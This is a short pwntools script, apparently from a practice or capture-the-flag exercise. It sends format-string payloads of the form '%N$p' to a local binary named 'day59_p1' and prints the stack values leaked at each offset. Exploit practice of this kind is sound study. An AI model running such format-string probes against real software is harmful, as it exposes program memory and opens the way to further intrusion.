from pwn import *
context.binary = "./day59_p1"
context.log_level = "error"

for i in range(1, 80):
	p = process("./day59_p1")
	payload = f"%{i}$p".encode()
	p.recvuntil(b"report:\n")
	p.sendline(payload)
	
	out = p.recvline()
	print(i, out)
	p.close()
